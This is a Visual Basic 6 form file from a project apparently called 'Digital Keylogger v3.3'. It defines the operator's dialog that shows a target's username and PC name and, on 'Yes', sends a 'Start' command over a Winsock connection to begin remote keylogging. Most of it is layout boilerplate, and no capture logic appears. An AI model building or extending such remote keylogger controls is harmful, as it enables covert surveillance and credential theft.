VERSION 5.00
Begin VB.Form Connected 
   Caption         =   "Connected"
   ClientHeight    =   3150
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   5565
   Icon            =   "Connected.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   Picture         =   "Connected.frx":030A
   ScaleHeight     =   3150
   ScaleWidth      =   5565
   StartUpPosition =   2  'CenterScreen
   Begin DigitalKeylogger3.ButtonXP Command3 
      Height          =   375
      Left            =   2280
      TabIndex        =   5
      Top             =   2400
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   661
      Caption         =   "Ok"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP Command2 
      Height          =   375
      Left            =   3240
      TabIndex        =   4
      Top             =   2400
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   661
      Caption         =   "No"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin DigitalKeylogger3.ButtonXP Command1 
      Height          =   375
      Left            =   1320
      TabIndex        =   3
      Top             =   2400
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   661
      Caption         =   "Yes"
      ButtonStyle     =   3
      OriginalPicSizeW=   0
      OriginalPicSizeH=   0
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MousePointer    =   99
   End
   Begin VB.Label Label7 
      BackStyle       =   0  'Transparent
      Caption         =   "PC Name : "
      BeginProperty Font 
         Name            =   "Monotype Corsiva"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   240
      TabIndex        =   9
      Top             =   1800
      Width           =   1215
   End
   Begin VB.Label Label6 
      BackStyle       =   0  'Transparent
      Caption         =   "Username :"
      BeginProperty Font 
         Name            =   "Monotype Corsiva"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   120
      TabIndex        =   8
      Top             =   1280
      Width           =   1215
   End
   Begin VB.Label Label5 
      BackStyle       =   0  'Transparent
      Caption         =   "To :"
      BeginProperty Font 
         Name            =   "Monotype Corsiva"
         Size            =   14.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   375
      Left            =   600
      TabIndex        =   7
      Top             =   840
      Width           =   495
   End
   Begin VB.Label Label4 
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Unknown"
      BeginProperty Font 
         Name            =   "Monotype Corsiva"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1440
      TabIndex        =   6
      Top             =   840
      Width           =   4215
   End
   Begin VB.Label Label3 
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Unknown"
      BeginProperty Font 
         Name            =   "Monotype Corsiva"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   1440
      TabIndex        =   2
      Top             =   1830
      Width           =   3375
   End
   Begin VB.Label Label2 
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Unknown"
      BeginProperty Font 
         Name            =   "Monotype Corsiva"
         Size            =   12
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   495
      Left            =   1440
      TabIndex        =   1
      Top             =   1320
      Width           =   3855
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      BackColor       =   &H00000000&
      BackStyle       =   0  'Transparent
      Caption         =   "Start Keylogging ?"
      BeginProperty Font 
         Name            =   "Monotype Corsiva"
         Size            =   15.75
         Charset         =   0
         Weight          =   700
         Underline       =   0   'False
         Italic          =   -1  'True
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H00FFFFFF&
      Height          =   375
      Left            =   360
      TabIndex        =   0
      Top             =   240
      Width           =   4935
   End
End
Attribute VB_Name = "Connected"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Public started As Integer

Private Sub Command1_Click()
On Error Resume Next
If Keylogger.Winsock1.State = 7 Then
Keylogger.Winsock1.SendData "Start"
Else: MsgBox "You are not connected", vbInformation, "Digital Keylogger v3.3"
End If
Unload Me
End Sub

Private Sub Command2_Click()
Unload Me
End Sub

Private Sub Command3_Click()
Unload Me
End Sub

Private Sub Form_Load()

If started = 1 Then
Command1.Visible = False
Command2.Visible = False
Label1.Caption = "Keylogging already started"
Command3.Visible = True
Else: Command3.Visible = False
End If

End Sub

Private Sub Form_Resize()
On Error Resume Next
Me.Width = 5685
Me.Height = 3660
End Sub
